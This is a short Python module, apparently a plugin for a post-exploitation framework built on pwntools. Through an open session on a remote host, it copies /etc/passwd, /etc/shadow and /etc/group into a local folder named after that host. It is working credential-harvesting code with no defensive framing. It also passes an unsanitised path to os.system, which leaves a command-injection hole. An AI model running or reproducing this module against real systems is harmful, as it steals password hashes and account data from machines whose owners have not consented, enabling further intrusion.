#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

waitforcapture = 1

def execute(session, configs, params):

    download_dir = configs["DownloadDirectory"] + session.host + "/"
    os.system("mkdir -p " + download_dir)
    session.download_file("/etc/passwd", download_dir + "passwd")
    session.download_file("/etc/shadow", download_dir + "shadow")
    session.download_file("/etc/group", download_dir + "group")
    return 0 
